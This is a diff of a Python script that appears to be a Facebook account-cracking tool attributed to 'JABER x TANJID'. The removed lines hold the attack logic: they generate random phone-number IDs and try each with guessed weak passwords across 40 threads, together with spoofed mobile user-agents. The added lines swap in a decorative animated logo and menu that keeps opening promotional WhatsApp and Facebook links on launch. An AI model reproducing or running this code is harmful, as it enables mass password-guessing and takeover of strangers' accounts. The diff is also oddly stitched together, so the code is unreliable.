@@ -89,15 +89,13 @@ for ua in range(10000):
 	h='Mobile Safari/537.36'
 	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
 	ugen.append(alhhaj)
-os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
-import os
-import sys
-import time
-import threading
+os.system("xdg-open https://chat.whatsapp.com/FHvSjN4TFVo3jFShtWegVH?mode=ems_copy_c") 
 
-# لوګو
-logo = """\
-\033[1;31m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚
+# -------------------------
+# ثابتونه / لوگو / رنگونه
+# -------------------------
+LOGO = r"""
+                        𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚
 
 ██╗    ██╗ █████╗  ██████╗██╗ ██████╗ 
 ██║    ██║██╔══██╗██╔════╝██║██╔═══██╗
@@ -105,99 +103,147 @@ logo = """\
 ██║███╗██║██╔══██║██║     ██║██║   ██║
 ╚███╔███╔╝██║  ██║╚██████╗██║╚██████╔╝
  ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝
-
-\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mBCS\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] WACIQ\033[1;39m           ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] WACIQ x WACIQ ARMY\033[1;39m  ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] WACIQ-DEV\033[1;39m          ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801852192547\033[1;39m     ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\033[1;39m     ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]free\033[1;39m               ┃
-\033[1;39m     ┗━━━━━━━━━━━━━━━━━━━\033[1;31mTEAM\033[1;39m━━━━━━━━━━━━━━━━━━━━┛
 """
 
-# د ټایپ انیمېشن فنکشن
-def animated_logo(logo, speed=0.002):
-    os.system("clear")
-    for char in logo:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(speed)
-    print("\033[0m")
+# ANSI رنګونه - د ټرمینل لپاره
+COLORS = {
+    "reset": "\033[0m",
+    "red": "\033[91m",
+    "green": "\033[92m",
+    "yellow": "\033[93m",
+    "blue": "\033[94m",
+    "magenta": "\033[95m",
+    "cyan": "\033[96m",
+}
+COLOR_CYCLE = [COLORS["red"], COLORS["green"], COLORS["yellow"],
+               COLORS["blue"], COLORS["magenta"], COLORS["cyan"]]
 
-# د لوگو اجرا
-def start_logo_thread():
-    t = threading.Thread(target=animated_logo, args=(logo,))
-    t.daemon = True
-    t.start()
-    t.join()  # انتظار تر څو بشپړ شي
+# څو لینکونه چې لوکال مینو کې کارولی شئ
+DEFAULT_LINKS = {
+    "whatsapp": "https://chat.whatsapp.com/FHvSjN4TFVo3jFShtWegVH?mode=ems_copy_c",
+    "facebook_group": "https://facebook.com/groups/544684501030088/",
+    "facebook_page": "https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official",
+}
 
-# اجرا کول
+
+# -------------------------
+# انیمیشن مدیریت
+# -------------------------
+_stop_event = threading.Event()
+_animation_thread = None
+
+def _clear_screen():
+    """ټرمینل پاکوي؛ cross-platform کوښښ."""
+    try:
+        sys.stdout.write("\033c")
+    except Exception:
+        pass
+
+def _animated_logo_loop(logo_text: str, width: int = 30, speed: float = 0.02):
+    """دا داخلي حلقه لوگو په ټرمینل کې ښيي او حرکت ورکوي."""
+    logo_lines = logo_text.splitlines()
+    shift = width
+    direction = -1
+    color_idx = 0
+    while not _stop_event.is_set():
+        _clear_screen()
+        color = COLOR_CYCLE[color_idx % len(COLOR_CYCLE)]
+        for line in logo_lines:
+            print(' ' * shift + color + line + COLORS["reset"])
+        color_idx += 1
+        shift += direction
+        if shift < 0 or shift > width:
+            direction *= -1
+        # د انیمیشن یو کوچنی وقف
+        for _ in range(max(1, int(1 / max(0.001, speed)))):
+            if _stop_event.is_set():
+                break
+            time.sleep(speed)
+
+def start_logo(logo_text: str = LOGO, width: int = 30, speed: float = 0.02):
+    """
+    انیمیشن شروع کوي.
+    بیرته د threading.Thread ابجیکټ بیرته ورکوي.
+    """
+    global _animation_thread, _stop_event
+    if _animation_thread and _animation_thread.is_alive():
+        return _animation_thread
+    _stop_event.clear()
+    _animation_thread = threading.Thread(target=_animated_logo_loop, args=(logo_text, width, speed), daemon=True)
+    _animation_thread.start()
+    return _animation_thread
+
+def stop_logo(timeout: float = 0.5):
+    """انیمیشن ودروي او thread ته اجازه ورکوي چې وتړل شي."""
+    global _animation_thread, _stop_event
+    _stop_event.set()
+    if _animation_thread:
+        _animation_thread.join(timeout=timeout)
+        _animation_thread = None
+
+
+# -------------------------
+# مینو او چاپ فنکشنونه
+# -------------------------
+def print_logo():
+    """لوگو یو ځل بې حرکت چاپوي (رنګ پرته یا ساده)."""
+    print(LOGO)
+
+def print_menu():
+    """ساده او پاک مینو چاپوي."""
+    print_logo()
+    print()
+    print(f" {COLORS['cyan']}╔═════════════════════════════════╗{COLORS['reset']}")
+    print(f" {COLORS['cyan']}║ {COLORS['magenta']}[1] {COLORS['reset']}{COLORS['green']} A  {COLORS['reset']}{COLORS['cyan']}  راندوم کلون        {COLORS['reset']}{COLORS['cyan']}║")
+    print(f" {COLORS['cyan']}╠═════════════════════════════════╣{COLORS['reset']}")
+    print(f" {COLORS['cyan']}║ {COLORS['magenta']}[2] {COLORS['reset']}{COLORS['green']} B  {COLORS['reset']}{COLORS['cyan']}  نور مینوګانې       {COLORS['reset']}{COLORS['cyan']}║")
+    print(f" {COLORS['cyan']}║ {COLORS['magenta']}[3] {COLORS['reset']}{COLORS['green']} C  {COLORS['reset']}{COLORS['cyan']}  زموږ پاڼه/ډله     {COLORS['reset']}{COLORS['cyan']}║")
+    print(f" {COLORS['cyan']}║ {COLORS['magenta']}[0] {COLORS['reset']}{COLORS['green']} X  {COLORS['reset']}{COLORS['cyan']}  وتل               {COLORS['reset']}{COLORS['cyan']}║")
+    print(f" {COLORS['cyan']}╚═════════════════════════════════╝{COLORS['reset']}")
+
+def prompt_menu_choice(prompt_text: str = "خپل انتخاب وليکئ: "):
+    """کارونکي نه انتخاب اخلي او بیرته ورکوي."""
+    try:
+        return input(f"{COLORS['yellow']}{prompt_text}{COLORS['reset']}")
+    except (KeyboardInterrupt, EOFError):
+        return "0"
+
+
+# -------------------------
+# مرستندویه: لینک خلاصول / معلومات
+# -------------------------
+def open_link(key: str, links: dict = None):
+    """د ورکړل شوي key مطابق لینک خلاصوي (webbrowser کاروي)."""
+    if links is None:
+        links = DEFAULT_LINKS
+    url = links.get(key)
+    if url:
+        webbrowser.open(url)
+        return True
+    return False
+
+def print_info_box(title: str, lines: list):
+    """یو ساده معلوماتي بکس چاپوي (پاک او منظم)."""
+    width = max(len(title), *(len(l) for l in lines)) + 4
+    print(" " + "═" * width)
+    print(f"  {title}")
+    print(" " + "─" * width)
+    for l in lines:
+        print(f"  {l}")
+    print(" " + "═" * width)
+
+
+# -------------------------
+# که دا فایل مستقلاً اجرا شي (مثالي demo)
+# -------------------------
 if __name__ == "__main__":
-    start_logo_thread() 
-def Jaber():
-    os.system('clear')
-    os.system('xdg-open https://facebook.com/groups/544684501030088/')
-    print(logo)
-    print("")
-    print("\033[1;96m ╔═════════════════════════════════╗")
-    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m║")
-    print("\033[1;96m ╠═════════════════════════════════╣")
-    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║")
-    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       \033[1;36m║")
-    print("\033[1;36m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
-    print("\033[1;96m ╚═════════════════════════════════╝")
-    print("")
-    Jaber = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
-    if Jaber in ["1","A"]:
-        Jabers()
-    if Jaber in ["2","B"]:
-        os.system('xdg-open https://facebook.com/groups/544684501030088/')
-    if Jaber in ["3","C"]:
-        os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
-    if Jaber in ["0","X"]:
-        os.system('exit')
-
-def Jabers():
-    user=[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print("\033[1;91m╔════════════════════════════════════════════╗")
-    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
-    print("\033[1;91m╚════════════════════════════════════════════╝")
-    code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
-    os.system('clear')
-    os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
-    print(logo)
-    print("\033[1;91m╔════════════════════════════════════════════╗")
-    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
-    print("\033[1;91m╚════════════════════════════════════════════╝")
-    limit=int(input("\033[1;32m ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :\033[1;36m "))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=40) as Fb_crack:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print("\033[1;91m╔═════════════════════════════════════╗")
-        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : '+code) 
-        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ : '+tl)
-        print(f'\033[1;91m║\033[1;92m MACK BY JABER x TANJID ')
-        print("\033[1;91m╚═════════════════════════════════════╝")
-        for love in user:
-            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
-            uid = code+love
-            Fb_crack.submit(Jaberm,uid,pwx,tl)
-    print("\033[1;91m╔═══════════════════════════╗")
-    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
-    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM JABER ')
-    print("\033[1;91m╚═══════════════════════════╝")
-
-
+    # د مثال لپاره: انیمیشن شروع، لږ وروسته مینو وښیه او ودروه
+    t = start_logo(width=20, speed=0.03)
+    time.sleep(1.2)
+    stop_logo()
+    print_menu()
+    choice = prompt_menu_choice()
+    print(f"تاسو انتخاب کړ: {choice}") 
 def Jaberm(uid,pwx,tl):
     global loop
     global cps
